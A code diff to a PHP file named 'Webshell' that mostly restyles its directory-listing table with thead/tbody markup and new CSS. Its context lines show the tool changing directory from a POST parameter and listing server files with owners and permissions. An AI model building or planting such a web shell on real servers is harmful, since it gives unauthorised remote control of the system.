@@ -1,5 +1,5 @@
 <?php
-    $NAME = "Webshell";
+    $NAME = "Webshell v1.0";
 
     if(isset($_POST["chdir"])){
         chdir($_POST["chdir"]);
@@ -131,28 +131,32 @@
 
         <h3>Directory listing</h3>
         <table>
-            <tr>
-                <th>Filename</th>
-                <th>Type</th>
-                <th>Filesize</th>
-                <th>Owner</th>
-                <th>Permissions</th>
-                <th>Last changed</th>
-            </tr>
-            <?php
-                $contents = getDirContents($CURRENT_DIR);
-                // print_r($contents);
-                foreach ($contents as $dir => $values) {
-                    echo "<tr>";
-                    echo "<th>".$dir."</th>";
-                    echo "<th>".$values["type"]."</th>";
-                    echo "<th>".$values["filesize"]."</th>";
-                    echo "<th>".$values["owner"]."</th>";
-                    echo "<th>".$values["permissions"]."</th>";
-                    echo "<th>".$values["last_changed"]."</th>";
-                    echo "</tr>";
-                }
-            ?>
+            <thead>
+                <tr>
+                    <th>Filename</th>
+                    <th>Type</th>
+                    <th>Filesize</th>
+                    <th>Owner</th>
+                    <th>Permissions</th>
+                    <th>Last changed</th>
+                </tr>
+            </thead>
+            <tbody>
+                <?php
+                    $contents = getDirContents($CURRENT_DIR);
+                    // print_r($contents);
+                    foreach ($contents as $dir => $values) {
+                        echo "<tr>";
+                        echo "<th>".$dir."</th>";
+                        echo "<th>".$values["type"]."</th>";
+                        echo "<th>".$values["filesize"]."</th>";
+                        echo "<th>".$values["owner"]."</th>";
+                        echo "<th>".$values["permissions"]."</th>";
+                        echo "<th>".$values["last_changed"]."</th>";
+                        echo "</tr>";
+                    }
+                ?>
+            </tbody>
         </table>
 
         <style>
@@ -175,11 +179,23 @@
                 margin: 0;
                 padding: 0;
             }
+            table{
+                border-collapse: collapse;
+            }
             table th{
                 text-align: left;
                 font-weight: normal !important;
                 font-family: Consolas, Menlo, Monaco, Lucida Console, Liberation Mono, DejaVu Sans Mono, Bitstream Vera Sans Mono, Courier New, monospace, serif;
                 padding-right: 25px;
+
+                border-collapse: collapse;
+                margin: 25px 0;
+                font-size: 0.9em;
+                font-family: sans-serif;
+                box-shadow: 0 0 20px rgba(0, 0, 0, 0.15);
+            }
+            table tbody tr:hover{
+                background-color: gray;
             }
         </style>
     </body>
